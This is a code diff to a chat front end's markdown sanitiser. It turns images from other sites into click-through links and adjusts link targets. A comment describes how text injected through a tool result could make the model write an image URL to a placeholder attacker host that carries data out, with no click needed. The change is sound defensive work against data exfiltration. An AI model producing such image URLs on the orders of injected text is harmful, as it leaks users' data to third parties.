@@ -17,15 +17,39 @@ const markedVuetify = createMarkedVuetify({
     6: 'text-body-medium font-weight-bold text-medium-emphasis mt-2 mb-1'
   }
 })
-const sanitizeOpts = getSanitizeOpts(sanitizeHtml.defaults)
-sanitizeOpts.allowedAttributes = { ...sanitizeOpts.allowedAttributes, a: ['href', 'target'] }
+const sanitizeOpts: sanitizeHtml.IOptions = getSanitizeOpts(sanitizeHtml.defaults)
+
+// An image loads by itself, while the answer streams, with no click: text injected through a tool result that
+// makes the model write ![](https://attacker/?d=<data>) would send that data out, around every allowlist. So only
+// images of the person's own site are shown — the page's CSP says the same (api/src/spa-csp.ts) — and any other
+// becomes a link, which takes a click. No srcset: it names more sources than the one checked.
+const isSiteImage = (src: string | undefined): boolean => {
+  const origin = (globalThis as { location?: { origin?: string } }).location?.origin
+  if (!src || !origin) return false
+  try { return new URL(src, origin).origin === origin } catch { return false }
+}
+sanitizeOpts.allowedAttributes = {
+  ...sanitizeOpts.allowedAttributes,
+  a: ['href', 'target'],
+  img: ['title', 'alt', 'src', 'height', 'width', 'loading']
+}
+sanitizeOpts.transformTags = {
+  img: (tagName, attribs) => isSiteImage(attribs.src)
+    ? { tagName, attribs }
+    : { tagName: 'a', attribs: { href: attribs.src ?? '' }, text: attribs.alt || attribs.src || 'image' }
+}
 marked.use(markedVuetify)
+
+// Embedded, a link goes to the host page, which the chat is beside. On a page of its own (an autonomous
+// agent's chat), the same target replaced the conversation with the link: there it opens a new tab, as a
+// link in any chat product does.
+const linkTarget = () => globalThis.window && window.top !== window.self ? '_top' : '_blank'
 
 marked.use({
   renderer: {
     link (token) {
       const html = marked.Renderer.prototype.link.call(this, token)
-      return html.replace('<a ', '<a target="_top" ')
+      return html.replace('<a ', `<a target="${linkTarget()}" `)
     }
   }
 })
